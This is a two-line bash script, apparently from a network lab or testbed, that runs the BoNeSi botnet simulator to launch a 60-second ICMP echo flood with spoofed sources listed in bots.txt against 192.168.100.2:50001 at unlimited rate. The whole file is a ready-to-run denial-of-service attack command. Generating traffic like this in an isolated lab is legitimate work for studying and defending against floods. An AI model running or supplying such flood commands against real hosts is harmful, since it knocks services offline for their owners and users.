#!/bin/bash

# BoNeSi ICMP Echo Flood (60 seconds)
sudo timeout -s INT 60 bonesi -i bots.txt -p icmp 192.168.100.2:50001 -s 0